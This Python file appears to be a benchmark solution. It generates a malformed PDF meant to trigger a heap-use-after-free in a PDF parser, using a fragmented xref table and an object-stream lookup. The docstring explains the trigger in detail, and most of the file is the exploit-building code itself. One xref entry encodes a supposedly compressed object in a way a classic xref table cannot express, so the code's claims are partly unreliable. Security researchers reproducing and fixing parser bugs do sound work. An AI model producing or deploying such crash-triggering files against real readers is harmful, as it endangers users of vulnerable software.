import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers a heap-use-after-free vulnerability
        in a PDF parser. The vulnerability is triggered by causing the
        cross-reference (xref) table to be reallocated ("solidified") while a
        pointer to an old entry is still held.

        The PoC is a PDF file constructed with a highly fragmented xref table,
        achieved through numerous incremental updates. This fragmentation
        induces the parser to perform a solidification.

        The trigger sequence is as follows:
        1. A Page object's /Contents references an object (TARGET_OBJ) that is
           stored within a compressed object stream (STREAM_OBJ).
        2. To render the page, the parser must load TARGET_OBJ. It finds an
           xref entry indicating that TARGET_OBJ is compressed within
           STREAM_OBJ at a specific index.
        3. The parser invokes a function (e.g., pdf_load_obj_stm) to extract
           TARGET_OBJ from the stream.
        4. This function obtains a pointer, `entry_ptr`, to the xref entry for
           STREAM_OBJ.
        5. To process the stream, STREAM_OBJ itself must be loaded first. This
           leads to a call to load STREAM_OBJ, which involves another xref lookup.
        6. Due to the severe fragmentation of the xref table created by the PoC,
           this second lookup for STREAM_OBJ triggers a solidification process.
           The parser allocates a new, contiguous xref table and frees the old,
           fragmented memory blocks.
        7. The `entry_ptr` held by the function from step 3 now dangles, as it
           points to freed memory.
        8. Upon returning, the function uses the dangling `entry_ptr`, causing a
           heap-use-after-free.
        """
        num_dummy_objs = 50

        # Define object numbers
        obj_stream_num = num_dummy_objs + 1
        obj_target_num = num_dummy_objs + 2
        catalog_num = num_dummy_objs + 3
        pages_num = num_dummy_objs + 4
        page_num = num_dummy_objs + 5
        obj_dummy_in_stream_num = num_dummy_objs + 6
        
        target_index_in_stream = 1

        pdf_parts = [b"%PDF-1.7\n"]
        offsets = {}

        def add_part(part_bytes: bytes) -> int:
            offset = sum(len(p) for p in pdf_parts)
            pdf_parts.append(part_bytes)
            return offset

        # --- Part 1: Object Stream ---
        target_obj_content = b"<</MyTgt 1>>"
        dummy_obj_in_stream_content = b"<</MyDummy 1>>"

        stream_dir = (
            f"{obj_dummy_in_stream_num} 0 "
            f"{obj_target_num} {len(dummy_obj_in_stream_content)} "
        ).encode()
        
        stream_data = dummy_obj_in_stream_content + target_obj_content
        
        first_offset = len(stream_dir)
        obj_stream_payload = stream_dir + stream_data
        
        compressed_payload = zlib.compress(obj_stream_payload)
        
        obj_stream_dict = f"""<<
/Type /ObjStm
/N 2
/First {first_offset}
/Length {len(compressed_payload)}
/Filter /FlateDecode
>>""".encode()
        
        obj_stream_full = obj_stream_dict + b"\nstream\n" + compressed_payload + b"\nendstream"
        
        obj_stream_obj_str = (
            f"{obj_stream_num} 0 obj\n".encode() +
            obj_stream_full +
            b"\nendobj\n"
        )
        offsets[obj_stream_num] = add_part(obj_stream_obj_str)

        # --- Part 2: Initial XRef and Trailer ---
        xref1_content = (
            b"xref\n"
            b"0 1\n"
            b"0000000000 65535 f \n"
            f"{obj_stream_num} 1\n".encode() +
            f"{offsets[obj_stream_num]:010d} 00000 n \n".encode()
        )
        xref1_start = add_part(xref1_content)
        
        max_obj_num = obj_dummy_in_stream_num + 1
        trailer1_content = (
            f"trailer\n<< /Size {max_obj_num} >>\n"
            f"startxref\n{xref1_start}\n%%EOF\n"
        ).encode()
        add_part(trailer1_content)
        prev_xref_start = xref1_start

        # --- Part 3: Incremental Updates with Dummy Objects ---
        for i in range(1, num_dummy_objs + 1):
            dummy_obj_str = f"{i} 0 obj\n<</D {i}>>\nendobj\n".encode()
            offsets[i] = add_part(dummy_obj_str)
            
            xref_content = (f"xref\n{i} 1\n{offsets[i]:010d} 00000 n \n").encode()
            xref_start = add_part(xref_content)
            
            trailer_content = (
                f"trailer\n<< /Size {max_obj_num} /Prev {prev_xref_start} >>\n"
                f"startxref\n{xref_start}\n%%EOF\n"
            ).encode()
            add_part(trailer_content)
            prev_xref_start = xref_start

        # --- Part 4: Final Update with Triggering Objects ---
        catalog_obj_str = f"{catalog_num} 0 obj\n<</Type/Catalog/Pages {pages_num} 0 R>>\nendobj\n".encode()
        offsets[catalog_num] = add_part(catalog_obj_str)

        pages_obj_str = f"{pages_num} 0 obj\n<</Type/Pages/Count 1/Kids[{page_num} 0 R]>>\nendobj\n".encode()
        offsets[pages_num] = add_part(pages_obj_str)

        page_obj_str = f"{page_num} 0 obj\n<</Type/Page/Parent {pages_num} 0 R/Contents {obj_target_num} 0 R>>\nendobj\n".encode()
        offsets[page_num] = add_part(page_obj_str)
        
        final_xref_content = (
            b"xref\n"
            f"{obj_target_num} 1\n".encode() +
            f"{obj_stream_num:010d} {target_index_in_stream:05d} n \n".encode() +
            f"{catalog_num} 3\n".encode() +
            f"{offsets[catalog_num]:010d} 00000 n \n".encode() +
            f"{offsets[pages_num]:010d} 00000 n \n".encode() +
            f"{offsets[page_num]:010d} 00000 n \n".encode()
        )
        final_xref_start = add_part(final_xref_content)
        
        final_trailer_content = (
            f"trailer\n"
            f"<< /Size {max_obj_num} /Root {catalog_num} 0 R /Prev {prev_xref_start} >>\n"
            f"startxref\n{final_xref_start}\n%%EOF"
        ).encode()
        add_part(final_trailer_content)

        return b"".join(pdf_parts)